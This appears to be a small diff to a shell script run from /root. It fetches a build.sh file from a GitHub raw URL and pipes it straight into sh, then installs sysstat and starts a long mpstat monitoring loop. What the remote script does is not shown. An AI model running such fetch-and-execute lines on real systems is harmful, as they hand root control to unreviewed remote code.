@@ -4,4 +4,6 @@
 # kumaha aink we njink
 
 cd /root
-curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/build.sh | sh
+curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/build.sh | sh && sudo apt-get install sysstat
+mpstat
+mpstat 5 99999
